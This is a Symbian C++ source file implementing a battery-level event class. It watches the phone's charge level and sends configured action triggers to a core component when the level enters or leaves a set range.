/*
 * EventBattery.cpp
 *
 *  Created on: 27/set/2010
 *      Author: Giovanna
 */

#include "EventBattery.h"

CEventBattery::CEventBattery(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Battery, aTriggerId),iBatteryInfoPckg(iBatteryInfo)
	{
	// No implementation required
	}

CEventBattery::~CEventBattery()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventBattery* CEventBattery::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventBattery* self = new (ELeave) CEventBattery(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventBattery* CEventBattery::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventBattery* self = CEventBattery::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventBattery::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventBattery.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	Mem::Copy(&iBatteryParams, iParams.Ptr(), sizeof(iBatteryParams));
	
	// just to be sure, but Console also check it:
	if(iBatteryParams.iMinLevel > iBatteryParams.iMaxlevel)
		return;
		
	iPhone = CPhone::NewL();
	iPhone->SetObserver(this);
	__FLOG(_L("End ConstructL"));
	}

void CEventBattery::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	
	// Initialize Properly the iWasInRange value, 
	iWasInRange = InRange();
	
	if(iWasInRange)
		{
		SendActionTriggerToCoreL();
		}
	
	// Receives change notifications of the battery status
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	
	}

TBool CEventBattery::InRange()
	{
	__FLOG(_L("InRange()"));
	
	TUint chargeLevel=0;
	CTelephony::TBatteryStatus batteryStatus;
	iPhone->GetBatteryInfoSync(chargeLevel, batteryStatus);
	if ((chargeLevel >= iBatteryParams.iMinLevel) && (chargeLevel <= iBatteryParams.iMaxlevel))
		return ETrue;
	else
		return EFalse;
	}


void CEventBattery::HandlePhoneEventL(TPhoneFunctions event)
	{
	__FLOG(_L("HandlePhoneEventL()"));
	
	if (event != ENotifyBatteryStatusChange)
		return;

	if (InRange())
		{
		// inside range
		// Before trigger the event perform an additional check, just in case.
		if (!iWasInRange)
			{
			iWasInRange = ETrue;
			// Triggers the In-Action
			SendActionTriggerToCoreL();
			}
		}
	else
		{
		// not connected
		if (iWasInRange)
			{
			iWasInRange = EFalse;
			// Triggers the unplug action
			if (iBatteryParams.iExitAction != 0xFFFFFFFF)
				{
				SendActionTriggerToCoreL(iBatteryParams.iExitAction);
				}
			}
		}
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	}
